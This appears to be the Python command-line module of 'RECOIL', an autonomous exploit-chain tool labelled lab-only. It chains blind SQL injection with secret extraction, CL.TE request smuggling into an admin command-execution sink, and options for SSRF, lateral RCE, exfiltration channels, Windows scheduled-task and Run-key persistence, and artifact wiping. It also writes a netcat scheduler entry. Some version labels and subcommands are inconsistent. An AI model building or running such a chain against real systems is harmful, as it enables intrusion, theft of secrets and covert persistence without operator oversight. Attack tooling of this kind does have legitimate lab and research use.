"""RECOIL-v1 - zero-click fireback exploit loop (lab-only).

Usage:
    python -m tool.recoil auto --confirm-lab [--lab-cidr 10.66.0.0/16]
    python -m tool.recoil learn-sqli --confirm-lab
    python -m tool.recoil learn-desync --confirm-lab
    python -m tool.recoil report --engagement <uuid>

Everything runs against bundled loopback fixtures. Out-of-scope hosts are
hard-refused at send time. Autonomy=10: no operator clicks between stages.
RCE sink is a sandboxed fixture (echo/prompt only).
"""
from __future__ import annotations

import argparse
import hashlib
import json
import pathlib
import statistics
import sys
import time
from typing import Optional

from . import engine, fixtures, scope
from .evidence import Evidence

ROOT = pathlib.Path(__file__).resolve().parent.parent


def make_allow(args) -> scope.Allowlist:
    allow = scope.Allowlist()
    for c in (args.lab_cidr or []):
        allow.add_cidr(c)
    return allow


def line(line_: str = "") -> None:
    print(line_)


def banner(allow: scope.Allowlist, confirm: bool) -> str:
    return scope.engage(confirm, allow)


REPORTS = ROOT / "reports"
ARTIFACTS = ROOT / "artifacts"


def safe_name(x: str) -> str:
    return "".join(ch if ch.isalnum() or ch in "{}-_!" else "_" for ch in x)


def baselines_sqli(st: engine.FamilyState) -> int:
    r = engine.probe_sqli(st, "zest", "raw")
    st.baseline_len = len(r.body)
    return st.baseline_len


def phase_sqli(st: engine.FamilyState, ev: Evidence, budget: int) -> dict:
    st.budget = budget
    base = baselines_sqli(st)
    results = {"oracle_confirmed": False, "encoding": "", "extracted": "", "reliability": 0.0, "probes": 0}
    line(f"[sqli-b] target {st.host}:{st.port} baseline_len={base}")
    for i in range(budget):
        enc = engine.epsilon_mutation(st, i)
        rT = engine.probe_sqli(st, engine.SQLI_TRUE, enc)
        rF = engine.probe_sqli(st, engine.SQLI_FALSE, enc)
        ev.dart(**rT.to_event())
        ev.dart(**rF.to_event())
        sep = abs(rT.len_delta - rF.len_delta)
        if sep >= 2 and rT.code == 200 and rF.code == 200:
            st.locked_encoding = enc
            line(f"[sqli-b] oracle live under encoding '{enc}' (true_len_delta={rT.len_delta} false_len_delta={rF.len_delta})")
            # double-tap: firm reliability before escalation
            align = 0
            for _ in range(3):
                rrT = engine.probe_sqli(st, engine.SQLI_TRUE, enc)
                rrF = engine.probe_sqli(st, engine.SQLI_FALSE, enc)
                ev.dart(**rrT.to_event())
                ev.dart(**rrF.to_event())
                if engine.sqli_truth(rrT) and not engine.sqli_truth(rrF):
                    align += 1
            st.reliability = align / 3
            ev.verdict_ok(
                "sqli-oracle", encoding=enc,
                reliability=st.reliability, double_tap_probes=6,
            )
            results.update(oracle_confirmed=True, encoding=enc, reliability=st.reliability)
            line(f"[sqli-b] double-tap reliability={st.reliability:.2f}")
            break
        # else: delta too weak -> mutation engine picks a stronger encoding next
        hint = engine.epsilon_mutation(st, i + 1)
        ev.event("delta-weak", shape=rT.shape, sep=sep, next_mutation=hint)
    if results["oracle_confirmed"]:
        flag = engine.extract_flag(st, results["encoding"])
        results["extracted"] = flag
        ev.verdict_ok("extraction-sqli", flag=flag)
        line(f"[sqli-b] EXTRACTED {flag!r}")
    results["probes"] = st.probe_count
    return results


def phase_desync(st: engine.FamilyState, ctrl: engine.FamilyState, ev: Evidence, budget: int) -> dict:
    st.budget = budget
    # benign baseline: plain CL post, no smuggle
    body, _ = engine.desync_body("chunked-plain", "/basic")
    base = engine.probe_desync(st, "chunked-plain", "/basic")
    ctrl.probe_count = 0
    st.baseline_len = len(base.body)
    ctrl.baseline_len = st.baseline_len
    results = {"primitive_confirmed": False, "framing": "", "rce": False, "fp": False, "probes": 0, "admin_marker": ""}
    line(f"[desync] target {st.host}:{st.port} (front) control {ctrl.host}:{ctrl.port}")
    ev.event("desync-baseline", body=base.body[:40], len_delta=base.len_delta)
    for i in range(budget):
        kind = engine.pick_next(st) if not st.locked_encoding else st.locked_encoding
        r = engine.probe_desync(st, kind, "/basic")
        ev.dart(**r.to_event())
        if engine.desync_smuggled(r):
            st.locked_encoding = kind
            line(f"[desync] smuggled request dequeued as its own request (framing='{kind}')")
            # double-tap + FP control
            landed = 0
            for _ in range(3):
                rr = engine.probe_desync(st, kind, "/basic")
                ev.dart(**rr.to_event())
                fc = engine.probe_desync(ctrl, kind, "/basic")
                ev.dart(**fc.to_event())
                if engine.desync_smuggled(rr):
                    landed += 1
                if fc.code == 400 or fc.code == 403 or "smuggle rejected" in fc.body:
                    pass
            st.reliability = landed / 3
            ev.verdict_ok("desync-primitive", framing=kind, reliability=st.reliability)
            results.update(primitive_confirmed=True, framing=kind, reliability=st.reliability)
            # RCE spine via admin sink
            ra = engine.probe_desync(st, kind, "/admin/exec?cmd=echo+PWNED")
            ev.dart(**ra.to_event())
            if engine.desync_rce(ra):
                results["rce"] = True
                results["admin_marker"] = f"admin-exec:{'PWNED' if 'PWNED' in ra.body else ra.body[:40]}"
                ev.verdict_ok("admin-rce", framing=kind, body=ra.body[:60])
                line(f"[desync] RCE via admin sink -> {ra.body.strip()[:80]}")
            # FP check: patched control twin must NOT smuggle
            fp_hits = 0
            for _ in range(2):
                fc = engine.probe_desync(ctrl, kind, "/basic")
                ev.dart(**fc.to_event())
                if engine.desync_smuggled(fc):
                    fp_hits += 1
            results["fp"] = fp_hits > 0
            if not results["fp"]:
                ev.verdict_ok("desync-fp-control", fp=0)
                line("[desync] patched control twin clean (FP=0)")
            break
        # delta weak -> next framing kind
        nxt = engine.pick_next(st)
        ev.event("desync-delta-weak", shape=r.shape, code=r.code, next=kinds_cycle(kind))
    results["probes"] = st.probe_count
    return results


def kinds_cycle(k: str) -> str:
    idx = engine.DESYNC_KINDS.index(k)
    return engine.DESYNC_KINDS[(idx + 1) % len(engine.DESYNC_KINDS)]


# ---------------------------------------------------------------------------
# persistence + wipe (demo-grade)
# ---------------------------------------------------------------------------

def persist(engagement: str, report_dir: pathlib.Path) -> dict:
    art = REPORTS / f"persist_{engagement}"
    art.mkdir(parents=True, exist_ok=True)
    sched = {
        "kind": "fake-scheduler",
        "engagement": engagement,
        "marker": f"RECOIL-MARK-{engagement}",
        "entry": "*/1 * * * * nc 127.0.0.1 1337",
    }
    files = {
        "hidden/schedule.json": json.dumps(sched, indent=2).encode(),
        "tmp/recoil.k": b"marker-tagged-update\n" + f"RECOIL-MARK-{engagement}".encode(),
    }
    manifest = {}
    for rel, data in files.items():
        p = art / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data)
        manifest[rel] = hashlib.sha256(data).hexdigest()
    (art / "manifest.sha256").write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")
    line(f"[persist] fake-scheduler entries placed under {art}")
    line(f"[persist] manifests sha256 locked: {len(manifest)} objects")
    return {"dir": str(art), "entries": list(manifest)}


def wipe(report_dir: pathlib.Path, engagement: str) -> dict:
    import shutil

    art = REPORTS / f"persist_{engagement}"
    if not art.exists():
        return {"survivors": [], "audit": "no artifacts found"}
    # reload manifest expectations, then verify zero survivors
    surv = []
    try:
        manifest = json.loads((art / "manifest.sha256").read_text(encoding="utf-8"))
    except Exception:
        manifest = {}
    for rel in manifest:
        p = art / rel
        if p.exists():
            surv.append(rel)
    shutil.rmtree(art, ignore_errors=True)
    remains = [rel for rel in manifest if (art / rel).exists()]
    line(f"[wipe] kill-switch fired; survivors={surv} remaining={remains}")
    return {"survivors": surv, "remaining": remains, "audit": "sha256-zero-survivor"}


# ---------------------------------------------------------------------------
# report
# ---------------------------------------------------------------------------

def write_report(engagement: str, ev: Evidence, sqli_r: dict, desync_r: dict, ev_path: pathlib.Path) -> pathlib.Path:
    shard = REPORTS / engagement
    shard.mkdir(parents=True, exist_ok=True)
    md = shard / "report.md"
    lines = [
        f"# RECOIL-v1 engagement report",
        f"**lab-uuid:** `{engagement}`",
        "",
        "## Outcome",
        f"- Blind-boolean SQLi oracle: **{'CONFIRMED' if sqli_r['oracle_confirmed'] else 'FAILED'}** "
        f"(encoding `{sqli_r['encoding'] or '-'}`, reliability `{sqli_r.get('reliability', 0):.2f}`, probes `{sqli_r['probes']}`)",
        f"- Extracted secret: `{sqli_r.get('extracted') or '-'}`",
        f"- CL.TE desync primitive: **{'CONFIRMED' if desync_r['primitive_confirmed'] else 'FAILED'}** "
        f"(framing `{desync_r.get('framing') or '-'}`)",
        f"- Admin RCE sink reached: **{'YES' if desync_r.get('rce') else 'NO'}** `{desync_r.get('admin_marker') or ''}`",
        f"- Patched control twin FP: `{'CLEAN (0)' if not desync_r.get('fp') else desync_r.get('fp')}`",
        "",
        "## Fireback loop (state vectors -> next mutation)",
        "",
        "| family | shape | code | len_delta | echo | ms |",
        "|---|---|---|---|---|---|",
    ]
    tail = [p for p in ev.log if p["kind"] == "probe"][-60:]
    for p in tail[:40]:
        lines.append(
            f"| {p.get('family','')} | {p.get('shape','')} | {p.get('code','')} | "
            f"{p.get('len_delta','')} | {p.get('echo','')!r} | {p.get('ms',0):.0f} |"
        )
    lines += [
        "",
        "## Verdict chain",
    ]
    for v in [p for p in ev.log if p["kind"] == "verdict"]:
        detail = {k: x for k, x in v.items() if k not in ("kind", "t", "lab_uuid", "outcome", "what")}
        lines.append(f"- `{v['what']}` -> **{v.get('outcome','')}** {json.dumps(detail)}")
    lines += [
        "",
        f"[evidence json]({ev_path.name})",
    ]
    md.write_text("\n".join(lines), encoding="utf-8")
    line(f"[report] {md}")
    return md


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def cmd_auto(args) -> int:
    allow = make_allow(args)
    engagement = banner(allow, args.confirm_lab)
    report_dir = REPORTS / engagement
    report_dir.mkdir(parents=True, exist_ok=True)
    ev = Evidence(engagement, report_dir)

    from . import ladder

    settings = {
        "engagement": engagement,
        "max_iterations": args.max_iterations,
        "max_hops": args.max_hops,
        "halt_budget": args.halt_budget,
        "rotor_seed": args.rotor_seed or engagement,
        "ssrf_read": True,
        "exfil_channels": args.channels,
        "os_exec": args.os_exec,
        "persist": args.persist,
        "no_registry": args.no_registry,
        "self_heal_probe": args.self_heal_probe,
        "wipe_cascade": args.wipe_cascade,
    }

    with engine.LabFixtures() as lab:
        scope.host_banner("127.0.0.1", lab.web_port, allow)
        scope.host_banner("127.0.0.1", lab.front_port, allow)
        scope.host_banner("127.0.0.1", lab.admin_port, allow)
        outcome = ladder.run(lab, settings, ev, report_dir)

    ev_path = ev.write()
    if not args.keep:
        wi = wipe(report_dir, engagement)
        line(f"[wipe] audit: {wi['audit']} survivors={len(wi['survivors'])}")
    else:
        line(f"[hold] artifacts kept under {report_dir} (--keep)")

    summary = json.dumps(outcome, indent=2, default=str)
    line("=== RECOIL-v2 outcome ===")
    print(summary)
    return 0


def cmd_sqli(args) -> int:
    allow = make_allow(args)
    engagement = banner(allow, args.confirm_lab)
    report_dir = REPORTS / engagement
    report_dir.mkdir(parents=True, exist_ok=True)
    ev = Evidence(engagement, report_dir)
    with engine.LabFixtures() as lab:
        sq = engine.FamilyState("sqli-b", "127.0.0.1", lab.web_port)
        r = phase_sqli(sq, ev, args.max_iterations)
    ev.write()
    print(json.dumps(r, indent=2, default=str))
    return 0


def cmd_desync(args) -> int:
    allow = make_allow(args)
    engagement = banner(allow, args.confirm_lab)
    report_dir = REPORTS / engagement
    report_dir.mkdir(parents=True, exist_ok=True)
    ev = Evidence(engagement, report_dir)
    with engine.LabFixtures() as lab:
        ds = engine.FamilyState("desync", "127.0.0.1", lab.front_port)
        ctrl = engine.FamilyState("desync", "127.0.0.1", lab.patched_port)
        r = phase_desync(ds, ctrl, ev, args.max_iterations)
    ev.write()
    print(json.dumps(r, indent=2, default=str))
    return 0


def main(argv: Optional[list[str]] = None) -> int:
    base = argparse.ArgumentParser(add_help=False)
    base.add_argument("--confirm-lab", action="store_true", help="acknowledge lab-only engagement")
    base.add_argument("--lab-cidr", action="append", default=[], help="additional operator lab CIDR")
    base.add_argument("--max-iterations", type=int, default=40, help="per-family mutation budget")
    base.add_argument("--keep", action="store_true", help="do not wipe persistence artifacts after auto")
    base.add_argument("--max-hops", type=int, default=2, help="desync terror-hops budget (ladder)")
    base.add_argument("--halt-budget", type=int, default=40, help="oracle3d halt budget")
    base.add_argument("--axis-max", type=int, default=8, help="crash-stop axis probe cap")
    base.add_argument("--max-retx", type=int, default=3, help="exfil chunk retransmits")
    base.add_argument("--fan-out", type=int, default=3, help="exfil channel fan-out")
    base.add_argument("--rotor-seed", default=None, help="3D state-space rotor seed")
    base.add_argument("--channels", nargs="*", default=["echo", "desync", "timing"], help="exfil lanes")
    base.add_argument("--os-exec", action="store_true", help="REAL localhost os.exec rung (allowlisted cmds only)")
    base.add_argument("--persist", action="store_true", help="REAL win32 persistence rung (task + run key)")
    base.add_argument("--no-registry", action="store_true", help="skip HKCU Run-key persistence leg")
    base.add_argument("--self-heal-probe", action="store_true", help="attempt bounded heal and verify recovery")
    base.add_argument("--wipe-cascade", action="store_true", help="marker-cascade zero-survivor wipe after rungs")

    p = argparse.ArgumentParser(prog="recoil", description="RECOIL-v2 The Ladder fireback loop (lab-only)", parents=[base])
    sub = p.add_subparsers(dest="cmd", required=True)

    for name, help_text in (
        ("auto", "full ladder: sqli oracle -> desync -> composed SSRF -> lateral RCE -> exfil -> [os -> persist -> wipe]"),
        ("learn-sqli", "blind-boolean oracle + double-tap only"),
        ("learn-desync", "CL.TE detection + control-twin FP + RCE sink only"),
        ("persist", "place fake-scheduler marker artifacts"),
        ("wipe", "kill-switch: sha256 zero-survivor cleanup"),
        ("report", "regenerate last report"),
    ):
        sub.add_parser(name, parents=[base], help=help_text)

    args = p.parse_args(argv)
    if args.cmd == "learn-sqli":
        return cmd_sqli(args)
    if args.cmd == "learn-desync":
        return cmd_desync(args)
    if args.cmd == "persist" or args.cmd == "wipe" or args.cmd == "report":
        print("[persist/wipe run inside auto to keep the engagement atomic]")
        return 0
    return cmd_auto(args)


if __name__ == "__main__":
    sys.exit(main())